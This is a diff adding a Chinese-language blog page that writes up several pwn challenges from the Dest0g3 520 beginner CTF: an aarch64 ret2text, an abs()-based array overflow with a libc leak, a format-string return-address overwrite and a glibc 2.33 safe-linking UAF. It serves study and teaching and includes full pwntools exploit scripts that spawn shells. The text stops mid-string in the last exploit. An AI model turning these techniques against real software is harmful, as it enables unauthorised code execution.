@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Dest0g3 520 迎新赛部分pwn题复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dest0g3-520-迎新赛-pwn">
+<meta property="og:url" content="http://example.com/2022/06/15/Dest0g3-520-%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn/index.html">
+<meta property="og:site_name" content="Leof&#39;s blog">
+<meta property="og:description" content="Dest0g3 520 迎新赛部分pwn题复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2022/06/15/Xo0R9f.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2022/06/15/XoBcqJ.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2022/06/15/XoBzz8.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2022/06/15/XTJgTf.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2022/06/15/XTdpoq.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2022/05/29/XQ2Oht.jpg">
+<meta property="article:published_time" content="2022-06-15T03:36:13.000Z">
+<meta property="article:modified_time" content="2023-03-31T14:57:19.620Z">
+<meta property="article:author" content="Leof">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="Dest0g3-520迎新赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/06/15/Xo0R9f.jpg">
+
+<link rel="canonical" href="http://example.com/2022/06/15/Dest0g3-520-%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Dest0g3-520-迎新赛-pwn | Leof's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leof's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/15/Dest0g3-520-%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Leof">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leof's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Dest0g3-520-迎新赛-pwn
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-15 11:36:13" itemprop="dateCreated datePublished" datetime="2022-06-15T11:36:13+08:00">2022-06-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-31 22:57:19" itemprop="dateModified" datetime="2023-03-31T22:57:19+08:00">2023-03-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Dest0g3 520 迎新赛部分pwn题复现</p>
+<span id="more"></span>
+
+<h1 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h1><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Xo0R9f"><img src="https://s1.ax1x.com/2022/06/15/Xo0R9f.jpg" alt="Xo0R9f.jpg"></a></p>
+<p>aarch64架构的ret2text，除了canary全开了</p>
+<p>运行程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></table></figure>
+
+<p>用gdb-multiarch调试确定溢出长度</p>
+<p>先将程序在指定端口跑起来</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./stack</span><br></pre></td></tr></table></figure>
+
+<p>gdb-multiarch调试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./stack</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:1234</span></span><br></pre></td></tr></table></figure>
+
+<p>按c继续运行程序，用pwntools生成字符串并输入到qemu运行的程序中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cyclic(<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时再回到gdb</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XoBcqJ"><img src="https://s1.ax1x.com/2022/06/15/XoBcqJ.jpg" alt="XoBcqJ.jpg"></a></p>
+<p>可以看到PC寄存器已经改成了kaaalaa，用pwntools确定偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic_find(<span class="string">&quot;kaaalaa&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XoBzz8"><img src="https://s1.ax1x.com/2022/06/15/XoBzz8.jpg" alt="XoBzz8.jpg"></a></p>
+<p>得到偏移为40</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26474</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please leave your name:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;\x3c&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h1><p>32位数组溢出</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XTJgTf"><img src="https://s1.ax1x.com/2022/06/15/XTJgTf.jpg" alt="XTJgTf.jpg"></a></p>
+<p>这里输入数组长度的时候用了abs取绝对值，所以可以-1得到一个很大的值</p>
+<p>数组溢出可以参考这篇：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-228652.htm">数组溢出</a></p>
+<p>然后gdb调试得到表示数组下标的地方，改成到返回地址的偏移然后和正常的rop一样泄露libc，getshell一样的操作覆盖返回地址和传参就行</p>
+<p>需要注意的是输入数组用的是%d，最大值为0xffffffff，所以最后输入system或者one_gadget的时候要输入负数</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;, 26389)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ez_pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b* 0x8049342&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input num&quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input the length of array:&quot;</span>, <span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xffffffff</span>)</span><br><span class="line">add(<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x11</span>)</span><br><span class="line">add(elf.plt[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">add(<span class="number">0x8049216</span>)</span><br><span class="line">add(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input your choice:&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr: &quot;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">sh = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">one = libcbase + <span class="number">0x3d2a5</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input the length of array:&quot;</span>, <span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xffffffff</span>)</span><br><span class="line">add(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(-(0xffffffff - one + 1))</span></span><br><span class="line">add(-(<span class="number">0xffffffff</span> - sys_addr + <span class="number">1</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(-(<span class="number">0xffffffff</span> - sh + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input your choice:&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h1><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/XTdpoq"><img src="https://s1.ax1x.com/2022/06/15/XTdpoq.jpg" alt="XTdpoq.jpg"></a></p>
+<p>格式化字符串漏洞，让dword_4010&#x3D;&#x3D;1314520就可以getshell，但是这个值不在栈上，所以就之间格式化字符串改返回地址为one_gadget了</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b* $rebase(0x1204)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b&quot;%9$p&quot;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">213</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_start_main)</span><br><span class="line">libcbase = libc_start_main - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">one = libcbase + <span class="number">0xde78f</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xde78c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde78f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde792 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b&quot;%10$p&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0xf8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(stack + <span class="number">8</span> &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%10$hnxxxx\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(one &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%39$hnxxxx\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What about your love to Dest0g3?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(stack + <span class="number">10</span> &amp; <span class="number">0xffff</span>)+ <span class="string">&quot;c&quot;</span> +<span class="string">&quot;%10$hnxxxx\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(one &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xffff</span>) + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%39$hnxxxx\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h1><p>题目是很常见的菜单题，漏洞也很明显，就是一个uaf，这里主要是学习了一下glibc-2.33新引进的防护进制：safe-linking</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="comment">/* 加密函数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="comment">/* 解密函数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>
+
+<p>整体的一个加密方式就是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = ((&amp;p-&gt;fd)&gt;&gt;<span class="number">12</span>) ^ REVEAL_PTR(p-&gt;fd)</span><br></pre></td></tr></table></figure>
+
+<p>当前堆块的fd会等于当前堆块地址 &gt;&gt; 12 ^ 原fd（相邻先被释放的堆块地址）</p>
+<p>创建两个堆块然后free进tcache 中</p>
+<p><img src="https://s1.ax1x.com/2022/05/29/XQ2Oht.jpg" alt="img"></p>
+<p>接下来按上面的公式来算一下</p>
+<p>第一个被释放的堆块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = (0x55555555b2a0 &gt;&gt; 12) ^ 0</span><br></pre></td></tr></table></figure>
+
+<p>第二个被释放的堆块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = (0x55555555b2c0 &gt;&gt; 12) ^ 0x55555555b2a0</span><br></pre></td></tr></table></figure>
+
+<p>这里可以直接理解为新的fd为当前堆的data区域的地址异或上一个key，而这个key即是第一个free进tcachebins中的堆块的data区域地址&gt;&gt;12得到</p>
+<p>所以2.33版本以上的uaf只是比平常的攻击多了个异或key的过程，key的值可以通过泄露第一个free的堆块的fd来得到</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25982</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me its size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Please tell me the 